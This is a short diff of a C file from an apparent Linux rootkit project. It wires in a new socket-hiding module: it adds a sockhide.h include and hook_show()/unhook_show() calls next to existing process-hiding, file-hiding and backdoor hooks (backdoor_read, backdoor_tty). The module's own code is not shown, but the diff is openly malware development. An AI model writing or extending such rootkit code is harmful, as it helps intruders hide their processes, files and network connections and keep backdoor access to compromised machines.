@@ -20,6 +20,7 @@
 #include "pidhide.h"
 #include "openhide.h"
 #include "read.h"
+#include "sockhide.h"
 
 extern rootkit_t rootkit;
 
@@ -79,6 +80,8 @@ init_hooks(void)
         backdoor_read();
     else if (rootkit.backdoor == BD_TTY)
         backdoor_tty();
+
+    hook_show();
 }
 
 void
@@ -100,6 +103,8 @@ remove_hooks(void)
 
     if (rootkit.backdoor != BD_OFF)
         unbackdoor();
+    
+    unhook_show();
 }
 
 void
